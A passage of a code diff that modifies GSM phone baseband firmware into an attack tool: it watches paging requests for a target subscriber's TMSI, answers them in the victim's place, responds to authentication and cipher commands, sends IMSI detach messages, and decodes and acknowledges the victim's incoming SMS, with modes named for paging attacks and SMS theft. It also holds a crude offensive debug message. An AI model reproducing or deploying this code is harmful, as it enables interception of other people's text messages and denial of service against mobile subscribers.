++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++
++	return 0;
++}
++static int tx_sms_cp_ack(uint8_t chan_nr, uint8_t recv, uint8_t send){
++	struct msgb *msg;
++	struct l1ctl_info_ul *l1i_ul;
++	struct gsm48_classmark1 cm;
++	uint8_t *mi;
++	
++	printf("\n-> N(R)=%d, N(S)=%d, CP-ACK\n", recv, send);
++
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	gsm48_encode_classmark1(&cm);
++
++	msg->l2h[0] = 0x0d;
++	msg->l2h[1]= LAPDm_CTRL_I(recv, send, 0);
++	msg->l2h[2] = 0x09;
++
++	mi = msgb_put(msg, 2);
++	/* TODO: don't hardcode that */
++	memcpy(mi, "\x89\x04", 2);
++
++	lapdm_pad_msgb(msg, 23);
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++
++	return 0;
++}
++
++static int tx_paging_response(uint8_t chan_nr, uint8_t *midata, uint8_t milen){
++	struct msgb *msg;
++	struct gsm48_hdr *gh;
++	struct gsm48_pag_rsp *pr;
++	struct l1ctl_info_ul *l1i_ul;
++
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++	gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));
++	pr = (struct gsm48_pag_rsp *) msgb_put(msg, sizeof(*pr) + milen);
++
++	gh->proto_discr = GSM48_PDISC_RR;
++	gh->msg_type = GSM48_MT_RR_PAG_RESP;
++
++	pr->key_seq = key_seq;
++	pr->cm2_len = sizeof(pr->cm2);
++	gsm48_encode_classmark2(&pr->cm2);
++
++	memcpy(pr->data, midata, milen);
++
++	msg->l2h[0] = LAPDm_ADDR(LAPDm_LPD_NORMAL, 0, CR_MS2BS_CMD);
++	msg->l2h[1]= LAPDm_CTRL_U(LAPDm_U_SABM, 1);
++	/* TODO compute actual length */
++	/* 7 (classmark2 + RR) + MI */
++	msg->l2h[2] = LAPDm_LEN(7 + milen);
++
++	lapdm_pad_msgb(msg, 23);
++
++	l1ctl_tx_data_req(msg);
++	printf("-> PAGING RESPONSE\n");
++
++	return 0;
++}
++
++static int tx_reset_req(uint8_t type){
++	struct msgb *msg;
++	struct l1ctl_reset *res;
++
++	msg = l1ctl_msgb_alloc(L1CTL_RESET_REQ);
++	if(!msg) return -1;
++	res = (struct l1ctl_reset *) msgb_put(msg, sizeof(*res));
++	res->type = type;
++
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++/* dummy measurement report */
++static int tx_meas_rep(uint8_t chan_nr, uint8_t tx_power, uint8_t timing_advance){
++	struct msgb *nmsg;
++	struct gsm48_hdr *gh;
++	struct gsm48_meas_res *mr;
++	struct l1ctl_info_ul *l1i_ul;
++	uint8_t *sacch_l1;
++	
++	nmsg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!nmsg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(nmsg, sizeof(*l1i_ul));
++
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0x40; // sacch indication
++
++	/* make space for sacch l1 header */
++	sacch_l1 = msgb_put(nmsg, 2);
++
++	nmsg->l2h = msgb_put(nmsg, 3);
++
++	gh = (struct gsm48_hdr *) msgb_put(nmsg, sizeof(*gh));
++	mr = (struct gsm48_meas_res *) msgb_put(nmsg, sizeof(*mr));
++
++	gh->proto_discr = GSM48_PDISC_RR;
++	gh->msg_type = GSM48_MT_RR_MEAS_REP;
++
++	/* measurement results */
++	mr->rxlev_full = 58;
++	mr->rxlev_sub = 58;
++	mr->rxqual_full = 0;
++	mr->rxqual_sub = 0;
++	mr->dtx_used = 0; // FIXME: no DTX yet
++	mr->ba_used = 0;
++	mr->meas_valid = 0;
++
++	mr->no_nc_n_hi = 0 >> 2;
++	mr->no_nc_n_lo = 0 & 3;
++	mr->rxlev_nc1 = 0;
++	mr->rxlev_nc2_hi = 0 >> 1;
++	mr->rxlev_nc2_lo = 0 & 1;
++	mr->rxlev_nc3_hi = 0 >> 2;
++	mr->rxlev_nc3_lo = 0 & 3;
++	mr->rxlev_nc4_hi = 0 >> 3;
++	mr->rxlev_nc4_lo = 0 & 7;
++	mr->rxlev_nc5_hi = 0 >> 4;
++	mr->rxlev_nc5_lo = 0 & 15;
++	mr->rxlev_nc6_hi = 0 >> 5;
++	mr->rxlev_nc6_lo = 0 & 31;
++	mr->bsic_nc1_hi = 0 >> 3;
++	mr->bsic_nc1_lo = 0 & 7;
++	mr->bsic_nc2_hi = 0 >> 4;
++	mr->bsic_nc2_lo = 0 & 15;
++	mr->bsic_nc3_hi = 0 >> 5;
++	mr->bsic_nc3_lo = 0 & 31;
++	mr->bsic_nc4 = 0;
++	mr->bsic_nc5 = 0;
++	mr->bsic_nc6 = 0;
++	mr->bcch_f_nc1 = 0;
++	mr->bcch_f_nc2 = 0;
++	mr->bcch_f_nc3 = 0;
++	mr->bcch_f_nc4 = 0;
++	mr->bcch_f_nc5_hi = 0 >> 1;
++	mr->bcch_f_nc5_lo = 0 & 1;
++	mr->bcch_f_nc6_hi = 0 >> 2;
++	mr->bcch_f_nc6_lo = 0 & 3;
++
++	nmsg->l2h[0] = LAPDm_ADDR(LAPDm_LPD_NORMAL, 0, CR_MS2BS_CMD);
++	nmsg->l2h[1]= 0x03; //LAPDm_CTRL_U(LAPDm_U_SABM, 1);
++	/* TODO compute actual length */
++	nmsg->l2h[2] = 0x49;
++
++	sacch_l1[0] = timing_advance;
++	sacch_l1[1] = tx_power;
++
++	printf("MEAS REP: pwr=%d TA=%d meas-invalid=%d "
++			"rxlev-full=%d rxlev-sub=%d rxqual-full=%d rxqual-sub=%d "
++			"dtx %d ba %d no-ncell-n %d\n", tx_power, ta, mr->meas_valid,
++			mr->rxlev_full - 110, mr->rxlev_sub - 110,
++			mr->rxqual_full, mr->rxqual_sub, mr->dtx_used, mr->ba_used,
++			(mr->no_nc_n_hi << 2) | mr->no_nc_n_lo);
++
++	l1ctl_tx_data_req(nmsg);
++}
++
++static int gsm48_rx_paging_p3(struct msgb *msg)
++{
++	struct gsm48_paging3 *pag;
++	struct msgb *mimsg = NULL;
++
++	if (msgb_l3len(msg) < sizeof(*pag)) {
++		printf("Paging3 message is too small.\n");
++		return -1;
++	}
++
++	pag = msgb_l3(msg);
++	/*
++	printf("TYP 3 - Paging1: %s chan %s to TMSI M(0x%x) \n",
++			pag_print_mode(pag->pag_mode),
++			chan_need(pag->cneed1), pag->tmsi1);
++	printf("Paging2: %s chan %s to TMSI M(0x%x) \n",
++			pag_print_mode(pag->pag_mode),
++			chan_need(pag->cneed2), pag->tmsi2);
++	printf("Paging3: %s chan %s to TMSI M(0x%x) \n",
++			pag_print_mode(pag->pag_mode),
++			"n/a ", pag->tmsi3);
++	printf("Paging4: %s chan %s to TMSI M(0x%x) \n",
++			pag_print_mode(pag->pag_mode),
++			"n/a ", pag->tmsi4);
++	*/
++
++	if(tmsi_match((uint8_t *)&pag->tmsi1, victim_tmsi)){
++		tx_chan_req();
++		mimsg = msgb_alloc(6, "mi"); 
++		if(!mimsg){
++			return -1;
+ 		}
+-		return;
++		mimsg->data[0] = 0x05;
++		mimsg->data[1] = 0xf4;
++		memcpy(&mimsg->data[2], &pag->tmsi1, 4);
++		mimsg->len = 6;
++		msgb_enqueue(&mi_queue, mimsg);
++		return 0;
++	}
++	if(tmsi_match((uint8_t *)&pag->tmsi2, victim_tmsi)){
++		tx_chan_req();
++		mimsg = msgb_alloc(6, "mi"); 
++		if(!mimsg){
++			return -1;
++		}
++		mimsg->data[0] = 0x05;
++		mimsg->data[1] = 0xf4;
++		memcpy(&mimsg->data[2], &pag->tmsi2, 4);
++		mimsg->len = 6;
++		msgb_enqueue(&mi_queue, mimsg);
++		return 0;
++	}
++	if(tmsi_match((uint8_t *)&pag->tmsi4, victim_tmsi)){
++		tx_chan_req();
++		mimsg = msgb_alloc(6, "mi"); 
++		if(!mimsg){
++			return -1;
++		}
++		mimsg->data[0] = 0x05;
++		mimsg->data[1] = 0xf4;
++		memcpy(&mimsg->data[2], &pag->tmsi4, 4);
++		mimsg->len = 6;
++		msgb_enqueue(&mi_queue, mimsg);
++		return 0;
+ 	}
+ 
+-	if (pm_mode == PM_RANGE_RESULT) {
+-		pm_mode = PM_IDLE;
+-		refresh_display();
+-		buzzer_volume(tone);
+-		buzzer_note(NOTE(NOTE_C, OCTAVE_5));
+-		tone_time = jiffies;
+-		tone_on = 1;
+-		return;
++	return 0;
++}
++
++
++static int gsm48_rx_paging_p2(struct msgb *msg)
++{       
++	struct gsm48_paging2 *pag;
++	int tag, len, mi_type;
++	char mi_string[GSM48_MI_SIZE];
++	struct msgb *mimsg = NULL;
++
++	if (msgb_l3len(msg) < sizeof(*pag)) {
++		printf("Paging2 message is too small.\n");
++		return -1;
++	}
++
++	pag = msgb_l3(msg);
++	/*
++	printf("TYP 2 - Paging1: %s chan %s to TMSI M(0x%x) \n",
++			pag_print_mode(pag->pag_mode),
++			chan_need(pag->cneed1), pag->tmsi1);
++	printf("Paging2: %s chan %s to TMSI M(0x%x) \n",
++			pag_print_mode(pag->pag_mode),
++			chan_need(pag->cneed2), pag->tmsi2);
++	*/
++
++	if(tmsi_match((uint8_t *)&pag->tmsi1, victim_tmsi)){
++		tx_chan_req();
++		mimsg = msgb_alloc(6, "mi"); 
++		if(!mimsg){
++			return -1;
++		}
++		mimsg->data[0] = 0x05;
++		mimsg->data[1] = 0xf4;
++		memcpy(&mimsg->data[2], &pag->tmsi1, 4);
++		mimsg->len = 6;
++		msgb_enqueue(&mi_queue, mimsg);
++		return 0;
++	}
++	if(tmsi_match((uint8_t *)&pag->tmsi2, victim_tmsi)){
++		tx_chan_req();
++		mimsg = msgb_alloc(6, "mi"); 
++		if(!mimsg){
++			return -1;
++		}
++		mimsg->data[0] = 0x05;
++		mimsg->data[1] = 0xf4;
++		memcpy(&mimsg->data[2], &pag->tmsi2, 4);
++		mimsg->len = 6;
++		msgb_enqueue(&mi_queue, mimsg);
++		return 0;
++	}
++
++	/* no optional element */
++	if (msgb_l3len(msg) < sizeof(*pag) + 3)
++		return 0;
++
++	tag = pag->data[0];
++	len = pag->data[1];
++	mi_type = pag->data[2] & GSM_MI_TYPE_MASK;
++
++	if (tag != GSM48_IE_MOBILE_ID)
++		return 0;
++
++	if (msgb_l3len(msg) < sizeof(*pag) + 3 + len) {
++		printf("Optional MI does not fit in here\n");
++		return -1;
++	}
++
++	/*
++	gsm48_mi_to_string(mi_string, sizeof(mi_string), &pag->data[2], len);
++	printf("Type 2 - Paging3: %s chan %s to %s M(%s) \n",
++			pag_print_mode(pag->pag_mode),
++			"n/a ",
++			mi_type_to_string(mi_type),
++			mi_string);
++	*/
++
++	if(tmsi_match(&pag->data[3], victim_tmsi)){
++		tx_chan_req();
++		mimsg = msgb_alloc(len + 1, "mi"); 
++		if(!mimsg){
++			return -1;
++		}
++		memcpy(mimsg->data, &pag->data, len + 1);
++		mimsg->len = pag->data[1] + 1;
++		msgb_enqueue(&mi_queue, mimsg);
++		return 0;
++	}
++
++	return 0;
++}
++
++static int tmsi_match(uint8_t *mi, uint8_t *tmsi){
++	if(attack_mode == MODE_ALL_PAGING){
++		printf("%s\n", osmo_hexdump(mi, 4));
++		return 1;
++	}
++	if(attack_mode == MODE_RANGE_PAGING && mi[3] >= tmsi_range_min && mi[3] <= tmsi_range_max && tmsi_range_min >= 0){
++		printf("%s\n", osmo_hexdump(mi, 4));
++		return 1;
++	}
++	if(attack_mode != MODE_NONE && mi[0] == tmsi[0] && mi[1] == tmsi[1] && mi[2] == tmsi[2] && mi[3] == tmsi[3]){
++		printf("%s\n", osmo_hexdump(mi, 4));
++		return 1;
++	}
++	if(attack_mode == MODE_NONE && mi[0] == tmsi[0] && mi[1] == tmsi[1] && mi[2] == tmsi[2] && mi[3] == tmsi[3]){
++		printf("\n\nFOUND\n\n");
+ 	}
++	printf("%s does not match\n", osmo_hexdump(mi, 4));
++	
++	return 0;
+ }
+ 
++
++static int gsm48_rx_paging_p1(struct msgb *msg)
++{
++	struct gsm48_paging1 *pag;
++	int mi_type, len1, tag, len2;
++	char mi_string[GSM48_MI_SIZE];
++	struct msgb *mimsg = NULL;
++
++	/* is there enough room for the header + LV? */
++	if (msgb_l3len(msg) < sizeof(*pag) + 2) {
++		printf("PagingRequest is too short.\n");
++		return -1;
++	}
++
++	pag = msgb_l3(msg);
++
++	mi_type = pag->data[1] & GSM_MI_TYPE_MASK;
++	len1 = pag->data[0];
++
++	if (mi_type != GSM_MI_TYPE_NONE) {
++		/*
++		gsm48_mi_to_string(mi_string, sizeof(mi_string), &pag->data[1], len1);
++		printf("Paging1: %s chan %s to %s M(%s) \n",
++				pag_print_mode(pag->pag_mode),
++				chan_need(pag->cneed1),
++				mi_type_to_string(mi_type),
++				mi_string);
++		*/
++	} else {
++		return 0;
++	}
++
++	if(tmsi_match(&pag->data[2], victim_tmsi)){
++		tx_chan_req();
++		mimsg = msgb_alloc(pag->data[0] + 1, "mi"); 
++		if(!mimsg){
++			return -1;
++		}
++		memcpy(mimsg->data, &pag->data, pag->data[0] + 1);
++		mimsg->len = pag->data[0] + 1;
++		msgb_enqueue(&mi_queue, mimsg);
++	}
++
++	if (msgb_l3len(msg) < sizeof(*pag) + 2 + len1 + 3)
++		return 0;
++
++	tag = pag->data[2 + len1 + 0];
++	len2 = pag->data[2 + len1 + 1];
++	mi_type = pag->data[2 + len1 + 2] & GSM_MI_TYPE_MASK;
++	if (tag == GSM48_IE_MOBILE_ID && mi_type != GSM_MI_TYPE_NONE) {
++		if (msgb_l3len(msg) < sizeof(*pag) + 2 + len1 + 3 + len2) {
++			printf("Optional MI does not fit here.\n");
++			return -1;
++		}
++		if(tmsi_match(&pag->data[2 + len1 + 2], victim_tmsi)){
++			tx_chan_req();
++			mimsg = msgb_alloc(pag->data[2 + len1 + 2] + 1, "mi"); 
++			if(!mimsg){
++				return -1;
++			}
++			memcpy(mimsg->data, &pag->data, &pag->data[2 + len1 + 2] + 1);
++			mimsg->len = pag->data[2 + len1 + 2] + 1;
++			msgb_enqueue(&mi_queue, mimsg);
++		}
++
++		/*
++		gsm48_mi_to_string(mi_string, sizeof(mi_string), &pag->data[2 + len1 + 2], len2);
++		printf("Paging2: %s chan %s to %s M(%s) \n",
++				pag_print_mode(pag->pag_mode),
++				chan_need(pag->cneed2),
++				mi_type_to_string(mi_type),
++				mi_string);
++		*/
++	}
++
++	return 0;
++}
++
++
++/* END OF PAGING functions */
++
++/* PM handling */
++
+ /* sync / SI */
+ 
+ static void enter_sync(void)
+@@ -993,6 +2078,7 @@ static void enter_sync(void)
+ 	struct l1ctl_fbsb_req *req;
+ 	uint16_t a = arfcn;
+ 
++	printf("ENTERING SYNC\n\n");
+ 	l1s_reset();
+ 	l1s_reset_hw();
+ 	pm_count = 0;
+@@ -1059,6 +2145,8 @@ uint16_t *_mnc, uint16_t *_lac)
+ 
+ static void request_ul_levels(uint16_t a)
+ {
++	/* we are not interested in any neighbor cell measurements */
++	return 0;
+ 	struct msgb *msg = l1ctl_msgb_alloc(L1CTL_NEIGH_PM_REQ);
+ 	struct l1ctl_neigh_pm_req *pm_req =
+ 		(struct l1ctl_neigh_pm_req *) msgb_put(msg, sizeof(*pm_req));
+@@ -1104,9 +2192,6 @@ static void handle_sync(void)
+ 		return;
+ 	}
+ 
+-	if (tone_on)
+-		return;
+-
+ 	/* no UL result, no SI result */
+ 	if (!ul_new && !(si_new & 0x100))
+ 		return;
+@@ -1163,6 +2248,7 @@ static void handle_sync(void)
+ 			printf("ccch_mode=%d\n", ccch_conf);
+ 
+ 			l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++			printf("FINISHED SYNC\n\n");
+ 		}
+ 		break;
+ 	case GSM48_MT_RR_SYSINFO_4:
+@@ -1174,14 +2260,6 @@ static void handle_sync(void)
+ 	if (cursor >= 0)
+ 		refresh_display();
+ 
+-	/* tone depends on successfully received BCCH */
+-	buzzer_volume(tone);
+-	tone_time = jiffies;
+-	tone_on = 1;
+-	if ((si_new & 0xff) == 0xff)
+-		buzzer_note(NOTE(NOTE_C, OCTAVE_2));
+-	else
+-		buzzer_note(NOTE(NOTE_C, OCTAVE_5));
+ 	si_new = 0;
+ }
+ 
+@@ -1237,6 +2315,16 @@ static void exit_rach(void)
+ 	refresh_display();
+ }
+ 
++static void handle_stuck(void){
++	unsigned long elapsed = jiffies - last_net_frame;
++
++	if(elapsed > HZ * 5 && ccch_conf != -1){
++		update_net_frame();
++		printf("\n[!] Did not receive anything from the network, resyncing!\n\n");
++		reenter_sync();
++	}
++}
++
+ static void handle_assign(void)
+ {
+ 	if (mode != MODE_RACH)
+@@ -1283,15 +2371,91 @@ static int gsm48_match_ra(struct gsm48_req_ref *ref)
+ 
+ 
+ /* note: called from IRQ context */
+-static void rx_imm_ass(struct msgb *msg)
++
++/*
++TODO:
++We have to check the random references in order to differ between immediate assignments
++for e.g. location update requests of phones locking on the cell
++*/
++static int rx_imm_ass(struct msgb *msg)
+ {
+ 	struct gsm48_imm_ass *ia = msgb_l3(msg);
++	uint8_t ch_type, ch_subch, ch_ts;
++	struct msgb *mimsg;
++	int rv;
+ 
+-	if (gsm48_match_ra(&ia->req_ref)) {
+-		assign = ASSIGN_RESULT;
+-		ta = ia->timing_advance;
+-		rach = 0;
++	/* Discard paket TBF assignement */
++	if (ia->page_mode & 0xf0)
++		return 0;
++
++	/* FIXME: compare RA and GSM time with when we sent RACH req */
++
++	current_chan = ia->chan_desc.chan_nr;
++	rsl_dec_chan_nr(current_chan, &ch_type, &ch_subch, &ch_ts);
++
++	if(ia->req_ref.ra != 0x9f)
++		return 0;
++
++	/* TODO: check if we really need to send this */
++	// tx_meas_rep(current_chan, 0, ia->timing_advance);
++	if (!ia->chan_desc.h0.h) {
++		/* Non-hopping */
++		uint16_t arfcnn;
++
++		arfcnn = ia->chan_desc.h0.arfcn_low | (ia->chan_desc.h0.arfcn_high << 8);
++
++		printf("GSM48 IMM ASS (ra=0x%02x, chan_nr=0x%02x, ARFCN=%u, TS=%u, SS=%u, TSC=%u) \n", ia->req_ref.ra,
++				current_chan, arfcn, ch_ts, ch_subch,
++				ia->chan_desc.h0.tsc);
++
++		/* request L1 to go to dedicated mode on assigned channel */
++		rv = l1ctl_tx_dm_est_req_h0(arfcnn, current_chan, ia->chan_desc.h0.tsc, GSM48_CMODE_SIGN);
++	} else {
++		/* Hopping */
++		uint8_t maio, hsn, ma_len;
++		uint16_t ma[64], arfcnn;
++		int i, j, k;
++
++		hsn = ia->chan_desc.h1.hsn;
++		maio = ia->chan_desc.h1.maio_low | (ia->chan_desc.h1.maio_high << 2);
++
++		printf("HOPPING GSM48 IMM ASS (ra=0x%02x, chan_nr=0x%02x, HSN=%u, MAIO=%u, TS=%u, SS=%u, TSC=%u) \n", ia->req_ref.ra,
++				current_chan, hsn, maio, ch_ts, ch_subch,
++				ia->chan_desc.h1.tsc);
++
++		/* decode mobile allocation */
++		ma_len = 0;
++		for (i=1, j=0; i<=1024; i++) {
++			arfcnn = i & 1023;
++			if (freq[arfcnn].mask & 0x01) {
++				k = ia->mob_alloc_len - (j>>3) - 1;
++				if (ia->mob_alloc[k] & (1 << (j&7))) {
++					ma[ma_len++] = arfcnn;
++				}
++				j++;
++			}
++		}
++
++		/* request L1 to go to dedicated mode on assigned channel */
++		rv = l1ctl_tx_dm_est_req_h1(maio, hsn, ma, ma_len, current_chan, ia->chan_desc.h1.tsc, GSM48_CMODE_SIGN);
++	}
++
++
++	mimsg = msgb_dequeue(&mi_queue);
++	if(!mimsg) {
++		reenter_sync();
++		return -1;
+ 	}
++
++	if(attack_mode == MODE_PAGING || attack_mode == MODE_RANGE_PAGING || attack_mode == MODE_STEAL_SMS){
++		tx_paging_response(current_chan, mimsg->data, mimsg->len);
++	} else {
++		tx_imsi_detach(current_chan, mimsg->data, mimsg->len);
++	}
++	init_lapdm();
++	msgb_free(mimsg);
++
++	return 0;
+ }
+ 
+ /* note: called from IRQ context */
+@@ -1318,6 +2482,7 @@ static void rx_imm_ass_rej(struct msgb *msg)
+ 	struct gsm48_req_ref *req_ref;
+ 	int i;
+ 
++	printf("\nIMM ASS RAPE!1!\n\n");
+ 	for (i = 0; i < 4; i++) {
+ 		/* request reference */
+ 		req_ref = (struct gsm48_req_ref *)
+@@ -1329,6 +2494,267 @@ static void rx_imm_ass_rej(struct msgb *msg)
+ 	}
+ }
+ 
++static void rx_acch(struct msgb *msg)
++{
++	uint8_t address = msg->data[0];
++	uint8_t control = msg->data[1];
++	uint8_t length = msg->data[2];
++	uint8_t n_recv;
++	uint8_t n_send;
++	uint8_t p_f, cr, s_u, sapi;
++
++	if(lapd_state.active == 0){
++		return;
++	}
++	cr = LAPDm_ADDR_CR(address);
++	sapi = LAPDm_ADDR_SAPI(address);
++
++	p_f = LAPDm_CTRL_PF_BIT(control);
++
++	printf("%s (%d) ", cr == 1 ? "CMD" : "RESP", p_f);
++	if(LAPDm_CTRL_is_I(control)){
++		/* in theory we would need to check the P bit and reply with
++		   an S func=RR frame, but we skip this and always reply with rr
++		*/
++		n_recv = LAPDm_CTRL_Nr(control);
++		n_send = LAPDm_CTRL_I_Ns(control);
++
++		/*
++		   On receipt of a valid I frame or supervisory frame (RR, RNR or REJ),
++		   even in the own receiver busy or timer recovery conditions, the data
++		   link layer entity shall treat the N(R) contained in this frame as an
++		   acknowledgement for all the I frames it has transmitted with an N(S)
++		   up to and including the received N(R) - 1. The value of the
++		   acknowledge state variable V(A) shall be set to the value of N(R). 
++		   as we acknowledge the receipt of an iframe, we have to send back N(S)...
++		*/
++		lapd_state.v_ack = n_send;
++
++		/*
++		   When a data link layer entity is not in an own receiver busy
++		   condition and receives a valid I frame whose send sequence number is
++		   equal to the current receive state variable V(R), the data link
++		   layer entity shall: increment by 1 its receive state variable V(R),
++		   and act as indicated below.
++		*/
++		/*
++		  The value of the receive state variable shall be incremented by one
++		  with the receipt of an error-free, in-sequence I frame whose send
++		  sequence number N(S) equals the receive state variable V(R).
++		*/
++		if(n_send == lapd_state.v_recv){
++			lapd_state.v_recv = inc_mod(lapd_state.v_recv, 8);
++		}
++
++		printf("LAPDm I frame ");
++
++		printf("N(R)=%d, N(S)=%d\n", n_recv, n_send);
++
++		/* The value of the send state variable shall be incremented by 1 with
++		   each successive I frame transmission */
++		/* BUG squashing: this should only be incremented on *sending* and I frame, not on receiving
++		lapd_state.v_send = inc_mod(lapd_state.v_send, 8);
++		*/
++
++		/*
++		   The receive ready (RR) supervisory frame is used by a data link layer entity to:
++		   a) indicate it is ready to receive an I frame;
++		   b) acknowledge previously received I frames numbered up to and including N(R) - 1
++		      (as defined in clause 5)
++		   c) clear a busy condition that was indicated by the earlier transmission of an
++		      RNR frame by that same data link layer entity.
++		*/
++		//if(lapd_state.v_send == 2) reenter_sync();
++		tx_lapdm_rr(current_chan, lapd_state.v_ack + 1);
++
++		if(length >= 0x5){
++			uint8_t proto_discr = msg->data[3];
++			uint8_t msg_type = msg->data[4];
++
++			switch(proto_discr){
++				case GSM48_PDISC_SMS:
++					printf("SMS ");
++					switch(msg_type){
++						case GSM411_MT_CP_DATA:
++							printf("CP-DATA ");
++							sms_state.sms_mode = SMS_CP_DATA;
++							/* N(S) will be what N(R) is on the downlink, receiver expects this as the next
++							   seq number */
++							decode_dspl_sms(msg->data, msg->len);
++							break;
++						default:
++							printf("unknown SMS (%x) ", msg_type);
++							break;
++					}
++					break;
++				case GSM48_PDISC_RR:
++					printf("RR ");
++					switch(msg_type){
++						case GSM48_MT_RR_CIPH_M_CMD:
++							printf("CIPHER MODE COMMAND ");
++							if(lapd_state.ciph_count >= 15) reenter_sync();
++							lapd_state.ciph_count++;
++							/* if we set a kc, respond with cipher mode complete */
++							if(cipher_mode == CIPHER_ACTIVE || attack_mode == MODE_STEAL_SMS){
++								enable_ciphering();
++								tx_cipher_mode_complete(current_chan, lapd_state.v_recv, n_recv);
++							}
++							break;
++						case GSM48_MT_RR_CHAN_REL:
++							printf("CHANNEL RELEASE ");
++							reenter_sync();
++							if(sms_state.sms_mode == SMS_RP_ACK){
++								sms_state.sms_mode = SMS_NONE;
++								refresh_display();
++							}
++							break;
++						default:
++							printf("unknown RR (%x) ", msg_type);
++							break;
++					}
++					break;
++				case GSM48_PDISC_CC:
++					printf("CC ");
++					switch(msg_type){
++						case GSM48_MT_CC_SETUP:
++							printf("CC SETUP ");
++							break;
++						case GSM48_MT_CC_HOLD:
++							printf("CC HOLD ");
++							break;
++						default:
++							printf("unknown CC (%x) ", msg_type);
++							break;
++					}
++					break;
++				case GSM48_PDISC_MM:
++					printf("MM ");
++					switch(msg_type){
++						case GSM48_MT_MM_ID_REQ:
++							printf("IDENTITY REQ ");
++							tx_identity_response(current_chan, lapd_state.v_recv, n_recv, msg->data[5]);
++							break;
++						case GSM48_MT_MM_AUTH_REQ:
++							printf("AUTH REQ ");
++							if(attack_mode == MODE_STEAL_SMS){
++								tx_authentication_response(current_chan, lapd_state.v_recv, n_recv);
++							}
++							break;
++						case GSM48_MT_MM_ABORT:
++							printf("ABORT ");
++							break;
++						default:
++							printf("unknown MM (%x) ", msg_type);
++							break;
++					}
++					break;
++				default:
++					if (sms_state.sms_mode == SMS_CP_DATA && sapi == LAPDm_SAPI_3){
++						tx_sms_cp_ack(current_chan, lapd_state.v_recv, n_recv);
++						decode_dspl_sms(msg->data, msg->len);
++						sms_state.sms_mode = SMS_CP_ACK;
++						printf("unkn0wn (%x) ", proto_discr);
++					}
++					return;
++					break;
++			}
++		}
++
++	} else if (LAPDm_CTRL_is_U(control)){
++		s_u = LAPDm_CTRL_U_BITS(control);
++
++		printf("LAPDm U frame func=");
++		switch(s_u){
++			case LAPD_U_SABM:
++			case LAPD_U_SABME:
++				printf("SABM (%d)", p_f);
++				lapd_state.sapi = sapi;
++				tx_lapdm_ua(current_chan);
++				break;
++			case LAPD_U_DM:
++				printf("DM");
++				break;
++			case LAPD_U_UI:
++				/*
++				   When a layer 3 entity requests unacknowledged information
++				   transfer, the UI unnumbered command shall be used to send
++				   information to its peer without affecting data link layer
++				   variables. UI command frames do not carry a sequence number.
++				   Therefore, the UI frame may be lost without notification to
++				   the layer 3 entity if a data link exception occurs during
++				   transmission of the command.
++				*/
++				printf("UI");
++				lapd_state.ui_count++;
++				if(lapd_state.ui_count>10 && lapd_state.active==1){
++					lapd_state.active=0;
++					reenter_sync();
++				}
++
++				break;
++			case LAPD_U_DISC:
++				printf("DISC");
++				/*
++				   The UA unnumbered response is used by a data link layer
++				   entity to acknowledge the receipt and acceptance of the mode
++				   setting commands (SABM or DISC). Received mode setting
++				   commands are not actioned until the UA response is
++				   transmitted.
++				*/
++				tx_lapdm_ua(current_chan);
++				printf("setting LAPDm session to inactive\n");
++				lapd_state.active = 0;
++				reenter_sync();
++				break;
++			case LAPD_U_UA:
++				printf("UA");
++				break;
++			default:
++				printf("unknown U frame");
++				break;
++		}
++
++	} else if (LAPDm_CTRL_is_S(control)){
++		/* r/p */
++		n_recv = LAPDm_CTRL_Nr(control);
++		s_u = LAPDm_CTRL_S_BITS(control);
++
++		printf("LAPDm S frame func=");
++
++		switch(s_u){
++			case LAPD_S_RR:
++				printf("RR ");
++				/*
++				   a) indicate it is ready to receive an I frame;
++				   b) acknowledge previously received I frames numbered up to and including N(R) - 1 
++				   c) clear a busy condition that was indicated by the earlier
++				      transmission of an RNR frame by that same data link layer
++				      entity.
++				*/
++				lapd_state.v_send = n_recv;
++				printf("N(R)=%d ", n_recv);
++				if (sms_state.sms_mode == SMS_CP_ACK) {
++					tx_sms_cp_data_rp_ack(current_chan, lapd_state.v_recv, lapd_state.v_send);
++					sms_state.sms_mode = SMS_RP_ACK;
++				}
++				break;
++			case LAPD_S_RNR:
++			case LAPD_S_REJ:
++				printf("RNR/REJ ");
++				break;
++			default:
++				printf("unknown S frame");
++				break;
++		}
++		if(p_f){
++			tx_lapdm_rr(current_chan, lapd_state.v_send);
++		}
++	} else {
++		printf("unknown LAPDm frame\n");
++	}
++	printf("\n\n\n\n");
++}
++
+ /* note: called from IRQ context */
+ static void rx_pch_agch(struct msgb *msg)
+ {
+@@ -1341,10 +2767,18 @@ static void rx_pch_agch(struct msgb *msg)
+ 		rx_imm_ass(msg);
+ 		break;
+ 	case GSM48_MT_RR_IMM_ASS_EXT:
+-		rx_imm_ass_ext(msg);
++		//rx_imm_ass_ext(msg);
+ 		break;
+ 	case GSM48_MT_RR_IMM_ASS_REJ:
+-		rx_imm_ass_rej(msg);
++		//rx_imm_ass_rej(msg);
++		break;
++	case GSM48_MT_RR_PAG_REQ_1:
++		gsm48_rx_paging_p1(msg);
++		break;
++	case GSM48_MT_RR_PAG_REQ_2:
++		gsm48_rx_paging_p2(msg);
++	case GSM48_MT_RR_PAG_REQ_3:
++		gsm48_rx_paging_p3(msg);
+ 		break;
+ 	}
+ }
+@@ -1389,6 +2823,9 @@ static void l1a_l23_tx(struct msgb *msg)
+ 	uint8_t chan_type, chan_ts, chan_ss;
+ 	struct l1ctl_neigh_pm_ind *pm_ind;
+ 	struct gsm_time tm;
